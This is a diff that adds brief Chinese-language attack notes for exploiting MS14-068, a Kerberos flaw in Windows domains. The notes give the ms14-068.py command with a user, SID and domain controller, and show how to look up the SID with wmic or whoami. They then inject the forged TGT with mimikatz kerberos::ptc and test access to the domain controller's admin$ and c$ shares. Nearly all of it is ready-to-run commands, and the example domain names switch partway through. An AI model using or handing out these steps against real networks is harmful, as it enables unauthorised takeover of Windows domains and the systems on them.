@@ -1,0 +1,18 @@
+本地WINDOWS:
+1.python.exe ms14-068.py -u user-a-1@dom-a.loc -s S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.local
+user-a-1@dom-a.loc位域用户
+S-1-5-21-557603841-771695929-1514560438-1103 为账号SID
+dc-a-2003.dom-a.local域这机全名
+可以通过：1)wmic useraccount where name=”USERNAME” get sid
+2)whoami /all   本机可以直接查出自己的SID；
+
+用法国神器破解，需要时最新版本的才支持，
+2.mimikatz.exe log  "kerberos::ptc TGT_user-a-1@dom-a.loc.ccache" exit
+
+TGT_user-a-1@dom-a.loc.ccache指的是第一步所生成的ccache文件。
+
+3. kerberos::ptc TGT_secpulse@secpulse.local.ccache
+4.查看：
+klist
+net use \\DC2.secpulse.local\admin$    //注:使用IP可能会失败 
+dir \\DC2.secpulse.local\c$ 看看有木有权限 好运~
